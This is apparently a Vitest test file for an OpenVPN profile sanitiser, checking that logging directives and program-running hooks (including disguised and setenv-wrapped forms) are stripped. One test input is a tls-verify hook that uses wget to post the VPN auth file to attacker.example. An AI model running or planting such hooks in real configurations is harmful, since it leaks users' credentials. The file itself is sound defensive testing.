import { describe, expect, it } from 'vitest';
import { composeProfile } from './engine.ts';

describe('composeProfile', () => {
  it('appends the Advanced box and drops directives that would hide the ready marker', () => {
    expect(composeProfile('client\nlog /tmp/x.log\nremote vpn 1194\ndaemon', 'tun-mtu 1400\n  log-append /tmp/y\nsyslog')).toBe(
      'client\nremote vpn 1194\ntun-mtu 1400\n',
    );
  });

  it('keeps directives that merely start with those words', () => {
    expect(composeProfile('logout-timeout 5\nverb 3', '')).toBe('logout-timeout 5\nverb 3\n\n');
  });

  it('drops directives that run a program, however OpenVPN would read them', () => {
    const hooks = [
      'tls-verify "/bin/sh -c \'wget --post-file=/run/mvpn/auth https://attacker.example\'"',
      '  --up /tmp/x',
      '"ipchange"/tmp/x',
      "'plugin' /tmp/x.so",
      'scr\\ipt-security 3',
      '\tdown /tmp/x',
      'config /run/mvpn/other',
      'dns-updown /tmp/x',
      'iproute /tmp/x',
    ];
    expect(composeProfile(['client', ...hooks].join('\n'), 'route-up /tmp/x\nauth-user-pass-verify /tmp/x via-env')).toBe('client\n');
  });

  it('drops a directive wrapped in setenv opt, which OpenVPN reads as the directive itself', () => {
    const wrapped = ['setenv opt tls-verify /tmp/x', '--setenv "opt" "tls-verify" /tmp/x', 'setenv\topt up /tmp/x'].join('\n');
    expect(composeProfile(`client\n${wrapped}`, '')).toBe('client\n\n');
  });

  it('keeps comments and directives that only look alike', () => {
    const profile = ['# up /tmp/x', '; tls-verify /tmp/x', 'route 10.0.0.0 255.0.0.0', 'up-delay', 'down-pre', 'setenv opt block-outside-dns', 'setenv up /tmp/x', 'auth-user-pass', 'remote vpn.example.com 1194'].join('\n');
    expect(composeProfile(profile, '')).toBe(`${profile}\n\n`);
  });
});
